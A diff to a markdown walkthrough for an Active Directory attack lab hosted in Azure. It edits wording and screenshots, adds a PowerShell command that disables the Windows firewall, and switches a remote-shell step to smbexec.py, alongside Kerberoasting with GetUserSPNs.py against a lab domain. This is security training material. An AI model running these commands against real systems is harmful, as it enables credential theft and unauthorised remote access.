@@ -18,7 +18,7 @@ Authenticate to your Azure portal:
 https://portal.azure.com
 ```
 
-Then, goto the hosted ARM template resource page on a new browser tab:.
+Then, go to the hosted ARM template resource page on a new browser tab:
 
 | &#x1f30e; URL | Browser on Students Local System |
 |---------------|----------------------------------|
@@ -207,6 +207,17 @@ The first login to the workstation will require approximately ten minutes to ful
 | ![WS Initial Desktop](img/win-rdp-initial-ws-desktop.jpg) | 
 |------------------------------------------------|
 
+Run the following command on the workstation from the Admin PowerShell prompt as shown in the subsequent screenshot. Note that there is a linked PowerShell Admin invoker on the desktop.
+
+```PowerShell
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+```
+
+This is shown in the next screenshot.
+
+| ![WS Disable Firewall](img/ws-disable-firewall.jpg) | 
+|------------------------------------------------|
+
 &#x21E8; *Step Complete, Go to the next step!*
 
 </blockquote></details>
@@ -259,7 +270,7 @@ apt install python3-virtualenv -y
 Or, use pip. 
 
 ```
-python3 -m pip install venv
+pip3 install virtualenv
 ```
 
 Now, let's rock and roll. One of the tools we didn't install via bootstrap on the Linux box was DonPAPI. This is a browser shredder (and more). Copy and paste the following block into your Linux terminal. 
@@ -399,7 +410,7 @@ cd /opt/impacket/examples
 ls
 ```
 
-| ![Virtual Environment Activation](img/venv-activate.jpg) | 
+| ![Impacket Tools - GetUserSPNs.py](img/impacket-tools-getuserspns.jpg) | 
 |------------------------------------------------|
 
 &#x21E8; *Step Complete, Go to the next step!*
@@ -410,7 +421,7 @@ ls
 
 </summary><blockquote>
 
-Get-UserSPNs is similar in that all members of the "Domain Users" group can request a service ticket for any account with a configured service principal name (SPN). This is the attack known as "Kerberoasting". The krbtgt's response to the requested service ticket operation includes a potentially crackable password hash.
+All members of the "Domain Users" group can request a service ticket for any account with a configured service principal name (SPN). This is the attack known as "Kerberoasting". The krbtgt's response to the requested service ticket operation includes a potentially crackable password hash.
 
 Let's gather hashes from the accounts running with assigned service principal names (SPNs). Why? These are the accounts that any domain user can request Kerberos service tickets for. Thus, the Kerberoast attack.
 
@@ -423,7 +434,7 @@ GetUserSPNs.py 'doazlab.com'/'doadmin':'DOLabAdmin1!' -dc-ip 192.168.2.4 -output
 cat /opt/hashes/kerbs.txt |less -S
 ```
 
-| ![getUserSPNs](img/getuserspns.jpg) |
+| ![getUserSPNs invocation](img/invoke-kerberoast.jpg) |
 |------------------------------------------------|
 
 Use either `CTRL + C` or `q` to exit this view.
@@ -473,18 +484,18 @@ DOLabAdmin1!
 
 <Details><summary>
 
-## &#x2465; Establish Semi-Interactive WMIC Shell
+## &#x2465; Establish Semi-Interactive SMB Shell
 
 </summary><blockquote>
 
 
 
-The wmiexec.py utility establishes a semi-interactive shell to a remote host. This is not an opsec safe tool and will get caught by most EDR products.
+The smbexec.py utility establishes a semi-interactive shell to a remote host. This is not an opsec safe tool and will get caught by most EDR products.
 
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
-python3 wmiexec.py doazlab.com/doadmin@192.168.2.5
+python3 smbexec.py doazlab.com/doadmin@192.168.2.5
 ```
 
 You will be prompted for a password.
@@ -507,7 +518,7 @@ exit
 
 ```
 
-| ![wmiexec.py Connection](img/wmiexec.jpg) |
+| ![wmiexec.py Connection](img/smbexec.jpg) |
 |------------------------------------------------|
 
 &#x21E8; *Step Complete, Go to the next step!*
